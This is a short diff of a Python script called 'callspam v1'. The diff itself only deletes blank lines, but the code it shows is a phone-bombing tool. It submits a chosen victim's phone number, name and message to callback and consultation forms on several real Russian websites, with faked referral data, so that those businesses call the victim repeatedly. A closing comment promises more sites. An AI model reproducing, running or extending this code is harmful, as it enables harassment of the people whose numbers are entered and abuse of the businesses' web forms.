@@ -1,4 +1,3 @@
-
 #!/usr/bin/python
 # callspam v1
 # Author: FSystem88
@@ -55,7 +54,6 @@ class callspam:
 			nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
 			rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:40]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
 			yuridicheskayakonsultaciya = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text})
-			
 			
 			
 			#скоро добавлю еще... Ждите
